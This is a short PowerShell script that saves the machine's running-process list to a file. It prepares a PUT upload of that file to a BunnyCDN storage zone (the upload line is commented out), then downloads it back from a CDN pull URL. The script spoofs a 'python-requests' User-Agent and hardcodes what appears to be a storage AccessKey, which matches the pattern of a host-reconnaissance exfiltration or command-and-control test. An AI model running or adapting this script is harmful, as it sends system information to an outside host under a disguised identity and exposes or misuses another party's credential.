$fname = "processes.txt"
Get-Process | Out-File -FilePath $fname

$uri = "https://ny.storage.bunnycdn.com/testdev2829/processes.txt"

$headers = @{
    "AccessKey"     = "814e8500-65b3-41a9-a638a74ec57d-911b-4a20"
    "User-Agent"    = "python-requests/2.32.3"
    "Content-Type"  = "application/octet-stream"
}

# $response = Invoke-WebRequest -Uri $uri -Method Put -InFile processes.txt -Headers $headers -UseBasicParsing

$uri = "https://testdev2829pull.b-cdn.net/$fname"

$response = Invoke-WebRequest -Uri $uri -Method Get 